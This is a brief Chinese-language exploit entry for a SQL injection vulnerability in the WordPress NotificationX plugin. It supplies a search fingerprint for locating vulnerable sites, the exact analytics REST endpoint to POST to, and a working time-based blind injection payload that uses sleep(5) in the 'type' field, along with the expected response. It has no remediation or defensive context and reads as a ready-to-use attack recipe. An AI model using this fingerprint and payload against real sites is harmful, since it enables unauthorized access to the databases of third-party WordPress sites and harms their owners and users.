# WordPressPluginSQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body="/wp-content/plugins/notificationx"`
- **请求**：`POST /wp-json/notificationx/v1/analytics HTTP/1.1`

**Payload**
```
{"nx_id": "1","type": "clicks`=1 and 1=sleep(5)-- -"}
```
- **响应特征**：200